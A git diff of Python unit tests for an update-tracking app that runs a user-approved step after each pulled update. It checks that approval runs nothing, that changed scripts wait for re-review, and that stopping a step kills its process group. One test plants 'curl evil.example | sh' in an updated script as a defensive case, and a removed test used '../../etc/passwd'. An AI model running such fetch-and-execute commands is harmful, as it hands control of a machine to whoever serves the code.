@@ -45,6 +45,156 @@ class UpstreamCase(unittest.TestCase):
         return git(self.other, "rev-parse", "HEAD")
 
 
+class AfterUpdatingTest(UpstreamCase):
+    """A clone's step after updates (applying.py): approved once, then run by each Update, inside the app. A real
+    clone, a real deploy.sh, and updates pushed to the project."""
+
+    def setUp(self):
+        super().setUp()
+        from couriercollie import config
+        from couriercollie.backend import Backend, Details
+
+        self.config = config
+        # The project ships a deploy script; your clone has it.
+        (self.other / "deploy.sh").write_text("#!/bin/sh\necho deploying\necho done > deployed.txt\n")
+        git(self.other, "add", ".")
+        git(self.other, "commit", "-q", "-m", "deploy script")
+        git(self.other, "push", "-q", "origin", "HEAD:main")
+        git(self.clone, "pull", "-q")
+        self.start = git(self.clone, "rev-parse", "HEAD")
+        self.path = Path(self.dir.name) / "repos.toml"
+        self.id = "github.com/a/project"
+        config.save(config.Config(repos=[config.TrackedRepo(
+            id=self.id, name="Project", url="", host="github", follow="branch", branch="main", kind="git",
+            source="scanned", local_path=str(self.clone), installed=self.start)]), self.path)
+        self.backend = Backend(self.path)
+        self.backend._run = lambda work, done: done(*UpdateClickedTest._attempt(work))
+        self.backend._details[self.id] = Details(state="ready", default_branch="main", install_scripts=["deploy.sh"])
+
+    def tearDown(self):
+        self.backend.shutdown()
+        super().tearDown()
+
+    def details(self):
+        return self.backend.details(self.id)
+
+    def repo(self):
+        return self.backend._config.find(self.id)
+
+    def update(self, script=None):
+        """The project changes (its script too, if given); Update is clicked."""
+        if script is not None:
+            (self.other / "deploy.sh").write_text(script)
+            git(self.other, "commit", "-q", "-am", "new deploy script")
+        self.push_upstream()
+        self.backend.updateRepo(self.id)
+
+    def test_approved_once_then_each_update_applies_itself(self):
+        d = self.details()
+        self.assertEqual(d["stepSuggestions"], [{"label": "Run deploy.sh", "command": "/bin/sh ./deploy.sh"}])
+        # Its first line says /bin/sh; it isn't marked to be run itself.
+        review = self.backend.reviewStep(self.id, "/bin/sh ./deploy.sh")
+        self.assertIn("# ---- deploy.sh ----\n#!/bin/sh\necho deploying", review)  # the script itself, to read
+        self.backend.approveStep(self.id, "/bin/sh ./deploy.sh")
+        self.assertFalse((self.clone / "deployed.txt").exists())  # approving runs nothing
+        self.update()
+        d = self.details()
+        self.assertEqual((d["stepResult"], d["stepOutput"], d["applyReminder"]), ("applied", "deploying", ""))
+        self.assertTrue((self.clone / "deployed.txt").exists())  # ran in the clone's folder
+        saved = self.config.load(self.path).repos[0]
+        self.assertEqual((saved.apply_command, saved.script_run_at), ("/bin/sh ./deploy.sh", saved.installed))
+
+    def test_a_changed_script_waits_to_be_looked_at_again(self):
+        self.backend.approveStep(self.id, "sh ./deploy.sh")
+        self.update("#!/bin/sh\necho deploying\ncurl evil.example | sh\n")  # an update changes what it runs
+        d = self.details()
+        self.assertTrue(d["stepChanged"])
+        self.assertEqual(d["stepResult"], "")  # not run
+        self.assertNotEqual(d["applyReminder"], "")  # still to be applied
+        self.assertIn("curl evil.example", self.backend.reviewStep(self.id, d["step"]))  # the new text, to read
+        self.backend.runStep(self.id)  # Run Now is refused too, until approved again
+        self.assertEqual(self.details()["stepResult"], "")
+        (self.clone / "deploy.sh").write_text("#!/bin/sh\necho reviewed\n")  # (made harmless for the test)
+        self.backend.approveStep(self.id, "sh ./deploy.sh")
+        self.backend.runStep(self.id)
+        self.assertEqual((self.details()["stepResult"], self.details()["stepChanged"]), ("applied", False))
+
+    def test_a_failed_step_says_so_and_isnt_applied(self):
+        self.backend.approveStep(self.id, "echo building; echo 'error: out of space' >&2; exit 3")
+        self.update()
+        d = self.details()
+        self.assertEqual((d["stepResult"], d["stepCode"]), ("failed", 3))
+        self.assertEqual(d["stepOutput"], "building\nerror: out of space")  # errors too, in order
+        self.assertNotEqual(d["applyReminder"], "")
+        self.assertNotEqual(self.repo().script_run_at, self.repo().installed)
+
+    def test_a_password_is_asked_for_in_a_terminal(self):
+        # sudo can't ask without a terminal: the step fails at once, and offers one.
+        self.backend.approveStep(self.id, "echo 'sudo: a terminal is required to read the password' >&2; exit 1")
+        self.backend.runStep(self.id)
+        self.assertEqual(self.details()["stepResult"], "password")
+        saved = updater.terminal_for
+        updater.terminal_for = lambda path, run: ("/bin/true", [])  # instead of a terminal window
+        self.addCleanup(setattr, updater, "terminal_for", saved)
+        self.assertEqual(self.backend.runStepInTerminal(self.id), "")
+
+    def test_nothing_can_be_typed_in(self):
+        # A step that waits for input gets none, so it can't hang the page.
+        self.backend.approveStep(self.id, "read answer; echo \"got [$answer]\"")
+        self.backend.runStep(self.id)
+        self.assertEqual(self.details()["stepOutput"], "got []")
+
+    def test_your_own_command_changed_and_removed(self):
+        self.backend.approveStep(self.id, "  echo one > out.txt  ")
+        self.assertEqual(self.details()["step"], "echo one > out.txt")
+        self.backend.approveStep(self.id, "echo two > out.txt")  # Change…
+        self.backend.runStep(self.id)
+        self.assertEqual((self.clone / "out.txt").read_text(), "two\n")
+        self.backend.removeStep(self.id)
+        self.assertEqual((self.details()["step"], self.details()["stepResult"]), ("", ""))
+        self.update()  # nothing runs; the reminder says it isn't applied
+        self.assertNotEqual(self.details()["applyReminder"], "")
+
+    def test_approval_covers_only_the_clones_own_files(self):
+        from couriercollie import applying
+
+        outside = Path(self.dir.name) / "outside.sh"
+        outside.write_text("echo hi\n")
+        command = f"sh {outside} && sh ./deploy.sh"
+        self.assertEqual([f.name for f in applying.named_files(str(self.clone), command)], ["deploy.sh"])
+
+    def test_not_for_what_isnt_a_clone(self):
+        repo = self.repo()
+        repo.local_path, repo.kind, repo.source = "", "AppImage", ""
+        self.backend.approveStep(self.id, "echo hi")
+        self.assertEqual((repo.apply_command, self.details()["afterUpdating"]), ("", False))
+
+
+class StopStepTest(unittest.TestCase):
+    def test_stop_ends_the_step_and_what_it_started(self):
+        import threading
+
+        from couriercollie import applying
+
+        with tempfile.TemporaryDirectory() as folder:
+            started, result = threading.Event(), {}
+            processes = []
+
+            def go():
+                result["code"] = applying.run(folder, "sleep 60 & sleep 60; echo never", lambda line: None,
+                                              lambda p: (processes.append(p), started.set()))
+            thread = threading.Thread(target=go)
+            thread.start()
+            self.assertTrue(started.wait(5))
+            applying.stop(processes[0])
+            thread.join(10)
+            self.assertFalse(thread.is_alive())
+            self.assertNotEqual(result["code"], 0)
+            # The background sleep it started is gone too (its whole process group).
+            out = subprocess.run(["pgrep", "-g", str(processes[0].pid)], capture_output=True, text=True)
+            self.assertEqual(out.stdout.strip(), "")
+
+
 class PullTest(UpstreamCase):
     def test_pulls_new_commits(self):
         newest = self.push_upstream(2)
@@ -204,14 +354,10 @@ class InstallScriptTest(unittest.TestCase):
         self.dir.cleanup()
 
     def test_found_by_name_and_uninstall_isnt_offered(self):
-        for name in ("install.sh", "uninstall.sh", "setup.sh", "README.md"):
+        Path(self.path, "scripts").mkdir()
+        for name in ("install.sh", "uninstall.sh", "setup.sh", "README.md", "scripts/setup.sh", "scripts/other.sh"):
             Path(self.path, name).write_text("#!/bin/bash\necho hi\n")
-        self.assertEqual(updater.install_scripts(self.path), ["install.sh", "setup.sh"])
-        self.assertEqual(updater.script_text(self.path, "install.sh"), "#!/bin/bash\necho hi\n")
-        with self.assertRaises(updater.UpdateError):
-            updater.script_text(self.path, "uninstall.sh")
-        with self.assertRaises(updater.UpdateError):
-            updater.script_text(self.path, "../../etc/passwd")
+        self.assertEqual(updater.install_scripts(self.path), ["install.sh", "setup.sh", "scripts/setup.sh"])
 
     def test_huge_files_arent_offered(self):
         Path(self.path, "install.sh").write_text("x" * (updater.SCRIPT_MAX_BYTES + 1))
@@ -228,9 +374,14 @@ class InstallScriptTest(unittest.TestCase):
         saved = os.environ["PATH"]
         os.environ["PATH"] = f"{bin_dir}:{saved}"
         self.addCleanup(os.environ.__setitem__, "PATH", saved)
-        program, args = updater.terminal_command(self.path, "install.sh")
+        self.assertEqual(updater._interpreter(script), ["/usr/bin/env", "bash", "./install.sh"])
+        program, args = updater.terminal_for(self.path, ["/bin/sh", "-c", "./install.sh"])
         self.assertEqual(Path(program).name, "konsole")
-        self.assertEqual(args, ["--workdir", self.path, "--hold", "-e", "/usr/bin/env", "bash", "./install.sh"])
+        self.assertEqual(args, ["--workdir", self.path, "--hold", "-e", "/bin/sh", "-c", "./install.sh"])
+        Path(self.path, "scripts").mkdir()
+        Path(self.path, "scripts/setup.sh").write_text("echo hi\n")
+        self.assertEqual(updater._interpreter(Path(self.path, "scripts/setup.sh"), "scripts/setup.sh"),
+                         ["sh", "./scripts/setup.sh"])  # run from the clone's folder
         script.chmod(0o755)
         self.assertEqual(updater._interpreter(script), ["./install.sh"])
         script.chmod(0o644)
@@ -287,26 +438,13 @@ class UpdateClickedTest(UpstreamCase):
         self.assertEqual(self.backend._checks.results[self.id].status, self.checker.UP_TO_DATE)
         self.assertFalse(self.backend.repo(self.id)["updateAvailable"])
 
-    def test_an_update_made_here_is_a_reminder_until_applied(self):
-        # Pulling only changes the files: a running program uses them once restarted, rebuilt or installed again.
-        (self.clone / "install.sh").write_text("echo hi\n")
-        self.backend._details[self.id].install_scripts = ["install.sh"]
-        saved = updater.terminal_command
-        updater.terminal_command = lambda path, name: ("/bin/true", [])  # instead of a terminal window
-        self.addCleanup(setattr, updater, "terminal_command", saved)
-        d = self.backend.details(self.id)
-        self.assertEqual((d["applyReminder"], [a["name"] for a in d["applyActions"]]), ("", ["install.sh"]))
+    def test_mark_as_applied(self):
+        # No step chosen: after an update, a reminder that a running program doesn't use it yet.
+        self.assertEqual(self.backend.details(self.id)["applyReminder"], "")
         self.backend.updateRepo(self.id)
         self.assertTrue(self.backend.details(self.id)["applyReminder"].startswith(
-            f"Updated here to commit {self.newest[:7]}. If it\u2019s running, it uses the update only once"))
+            f"Updated here to commit {self.newest[:7]}, but not applied yet"))
         self.assertEqual(self.config.load(self.path).repos[0].updated_to, self.newest)  # kept
-        self.assertEqual(self.backend.runInstallScript(self.id, "install.sh"), "")  # applied: the reminder goes
-        self.assertEqual(self.backend.details(self.id)["applyReminder"], "")
-        self.assertEqual(self.config.load(self.path).repos[0].script_run_at, self.newest)
-
-    def test_mark_as_applied(self):
-        self.backend.updateRepo(self.id)
-        self.assertNotEqual(self.backend.details(self.id)["applyReminder"], "")
         self.backend.markApplied(self.id)  # done by hand, or by the project's own updater
         self.assertEqual(self.backend.details(self.id)["applyReminder"], "")
 
@@ -414,9 +552,10 @@ class CloneTest(UpstreamCase):
         backend.updateRepo(self.id)
         d = backend.details(self.id)
         folder = Path(os.environ["COURIERCOLLIE_CLONES"]) / "project"
-        self.assertEqual(d["updateNote"], f"Cloned main into {folder}. To install it, see Applying the Update, below.")
+        self.assertEqual(d["updateNote"], f"Cloned main into {folder}. To install it, choose its step under After "
+                                          "Updating, then Run Now.")
         self.assertEqual(d["statusKind"], "current")
-        self.assertEqual(d["installScripts"], ["install.sh"])
+        self.assertEqual([s["label"] for s in d["stepSuggestions"]], ["Run install.sh"])
         self.assertFalse(d["installClones"])
         self.assertTrue(d["isClone"])
         from couriercollie import config
